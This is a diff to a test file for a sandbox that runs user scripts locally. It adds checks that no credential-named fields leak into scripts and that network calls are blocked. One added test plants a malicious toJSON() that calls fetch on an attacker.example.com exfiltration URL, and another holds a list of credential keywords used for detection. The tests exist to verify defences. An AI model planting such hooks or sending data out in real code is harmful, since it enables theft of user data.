@@ -956,7 +956,7 @@ describe('local-execution — executeScriptLocally', () => {
         });
     });
 
-    test('Should never expose an auth token via globalThis, including nested inside $.Source', async () => {
+    test('Should never expose a credential-shaped field anywhere on $, not just inside $.Source', async () => {
         const result = await executeScriptLocally(
             func,
             TEST_PROJECT_ROOT,
@@ -964,18 +964,33 @@ describe('local-execution — executeScriptLocally', () => {
             stubExecuteAction,
             loadModuleReturning({
                 example: () => {
-                    // Recurses into $.Source (a plain data object) but not $.Actions (a Proxy dispatch mechanism, not a data container we'd leak a token into).
-                    const containsTokenKey = (value: unknown): boolean =>
+                    const CREDENTIAL_SUBSTRINGS = [
+                        'token',
+                        'secret',
+                        'key',
+                        'password',
+                        'credential',
+                    ];
+                    const hasCredentialName = (key: string) =>
+                        CREDENTIAL_SUBSTRINGS.some((substring) =>
+                            key.toLowerCase().includes(substring),
+                        );
+                    // Recurses into every value, but never enumerates Actions itself (a Proxy dispatch
+                    // mechanism, not a data container) — the preview response backing the rest of $ is
+                    // validated only for Source's shape, so nothing else stops an unexpected field
+                    // (present now or added later) from reaching it undetected.
+                    const containsCredentialKey = (value: unknown): boolean =>
                         typeof value === 'object' &&
                         value !== null &&
                         Object.entries(value).some(
                             ([key, nested]) =>
-                                key.toLowerCase().includes('token') || containsTokenKey(nested),
+                                hasCredentialName(key) || containsCredentialKey(nested),
                         );
                     const dollar = testDollar();
+                    const { Actions: _actions, ...dollarWithoutActions } = dollar;
                     return (
-                        Object.keys(globalThis).some((k) => k.toLowerCase().includes('token')) ||
-                        containsTokenKey(dollar.Source)
+                        Object.keys(globalThis).some(hasCredentialName) ||
+                        containsCredentialKey(dollarWithoutActions)
                     );
                 },
             }),
@@ -1467,6 +1482,63 @@ describe('local-execution — executeScriptLocally', () => {
                 ),
             ).rejects.toThrow(/must have an inputs field/);
             expect(executeAction).not.toHaveBeenCalled();
+        });
+
+        // Mirrors the raw $.Actions path's malicious-toJSON() test: the action-catalog typed-wrapper
+        // path doesn't share code with makeActionsProxy, so it needs the same coverage separately.
+        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            let registeredImpl:
+                | ((actionId: string, request: unknown) => Promise<unknown>)
+                | undefined;
+            let fetchAttempt: Promise<unknown> | undefined;
+            const maliciousRequest = {
+                inputs: {
+                    text: 'hi',
+                    toJSON() {
+                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                        return { text: 'hi' };
+                    },
+                },
+                connectionId: 'conn-1',
+            };
+
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        example: async () =>
+                            registeredImpl?.(
+                                'com.datadoghq.slack.chat.postMessage',
+                                maliciousRequest,
+                            ),
+                    };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    return {
+                        setExecuteActionImplementation: (
+                            impl: (actionId: string, request: unknown) => Promise<unknown>,
+                        ) => {
+                            registeredImpl = impl;
+                        },
+                    };
+                }
+                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
+                error.code = 'MODULE_NOT_FOUND';
+                throw error;
+            };
+
+            const result = await executeScriptLocally(
+                funcWithConnection,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
+            expect(fetchAttempt).toBeDefined();
+            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
         });
 
         // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
